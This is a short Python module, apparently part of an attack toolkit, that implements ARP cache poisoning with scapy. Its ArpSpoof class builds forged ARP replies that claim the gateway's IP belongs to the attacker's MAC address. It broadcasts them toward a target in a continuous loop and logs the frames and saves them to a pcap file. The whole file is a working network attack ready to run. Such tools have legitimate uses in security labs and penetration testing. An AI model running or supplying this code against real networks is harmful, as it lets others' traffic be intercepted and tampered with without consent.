import time
from scapy.all import Ether, ARP, sendp, get_if_hwaddr
from attacks.base import BaseAttack


class ArpSpoof(BaseAttack):
    def run(self):
        target_ip    = self.params.get("target_ip", "")
        gateway_ip   = self.params.get("gateway_ip", "192.168.1.1")
        attacker_mac = get_if_hwaddr(self.iface)

        if not target_ip:
            self.log("ARP Spoof: no target IP", "error"); return

        self.log(f"ARP Spoof: poisoning {target_ip} — spoofing {gateway_ip} as {attacker_mac}", "warn")
        writer = self.open_pcap()

        pkt = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
            / ARP(op=2, hwsrc=attacker_mac, psrc=gateway_ip,
                  hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
        )
        sent = 0
        while not self._stop.is_set():
            sendp(pkt, iface=self.iface, verbose=False)
            self.write(pkt)
            sent += 1
            if sent % 50 == 0:
                self.log(f"ARP Spoof: {sent} gratuitous frames sent", "info")
            time.sleep(0.1)

        writer.close()
